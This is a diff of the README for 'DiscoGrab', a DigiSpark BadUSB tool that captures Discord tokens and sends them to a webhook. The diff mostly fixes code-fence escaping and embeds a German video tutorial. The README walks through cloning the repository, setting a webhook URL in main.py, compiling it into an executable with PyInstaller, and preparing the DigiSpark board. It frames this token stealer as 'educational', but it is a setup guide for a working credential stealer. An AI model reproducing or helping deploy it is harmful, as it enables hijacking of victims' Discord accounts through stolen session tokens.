@@ -1,3 +1,6 @@
+
+
+```markdown
 # DiscoGrab
 
 A DigiSpark-based tool for educational purposes that demonstrates how Discord tokens can be captured using a combination of Python and DigiSpark scripts.
@@ -54,10 +57,10 @@ This project is based on the [corehub-lol/DiscoGrab](https://github.com/corehub-
 
 1. Clone the DiscoGrab repository:
 
-   \`\`\`bash
+   ```bash
    git clone https://github.com/corehub-lol/DiscoGrab.git
    cd DiscoGrab
-   \`\`\`
+   ```
 
 2. Open `main.py` in your preferred text editor
 
@@ -65,7 +68,7 @@ This project is based on the [corehub-lol/DiscoGrab](https://github.com/corehub-
 
    ```python
    WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"
-   \`\`\`
+   ```
 
 4. Save the file
 
@@ -73,15 +76,15 @@ This project is based on the [corehub-lol/DiscoGrab](https://github.com/corehub-
 
 1. Install PyInstaller if you haven't already:
 
-   \`\`\`bash
+   ```bash
    pip install pyinstaller
-   \`\`\`
+   ```
 
 2. Compile the Python script into an executable:
 
-   \`\`\`bash
+   ```bash
    python -m PyInstaller --onefile main.py
-   \`\`\`
+   ```
 
 3. The executable will be created in the `dist` folder
 
@@ -95,9 +98,9 @@ This project is based on the [corehub-lol/DiscoGrab](https://github.com/corehub-
 1. Install the Arduino IDE and set it up for DigiSpark:
    - Go to `File > Preferences`
    - Add this URL to *Additional Board Manager URLs*:  
-     \`\`\`
+     ```
      http://digistump.com/package_digistump_index.json
-     \`\`\`
+     ```
    - Go to `Tools > Board > Boards Manager`
    - Search for **Digistump AVR Boards** and install it
 
@@ -143,7 +146,12 @@ This project is based on the [corehub-lol/DiscoGrab](https://github.com/corehub-
 ## Video Tutorial
 
 For a detailed walkthrough of the setup and usage process, check out this tutorial:
-- [DiscoGrab Setup Tutorial](https://www.youtube.com/watch?v=58ugvXHy0mI) (Note: This tutorial is only available in German)
+
+<div align="center">
+  <iframe width="560" height="315" src="https://www.youtube.com/embed/58ugvXHy0mI" frameborder="0" allowfullscreen></iframe>
+</div>
+
+*(Note: This tutorial is only available in German)*
 
 ## Contributing
 
@@ -151,17 +159,17 @@ Contributions for educational improvements are welcome:
 
 1. Fork the repository  
 2. Create your feature branch:  
-   \`\`\`bash
+   ```bash
    git checkout -b feature/improvement
-   \`\`\`
+   ```
 3. Commit your changes:  
-   \`\`\`bash
+   ```bash
    git commit -m "Add educational improvement"
-   \`\`\`
+   ```
 4. Push to the branch:  
-   \`\`\`bash
+   ```bash
    git push origin feature/improvement
-   \`\`\`
+   ```
 5. Open a Pull Request
 
 ## License
@@ -173,3 +181,5 @@ This project is licensed under the MIT License – see the [LICENSE](LICENSE) fi
 <div align="center">
   <sub>Created for educational purposes only. Use responsibly.</sub>
 </div>
+```
+
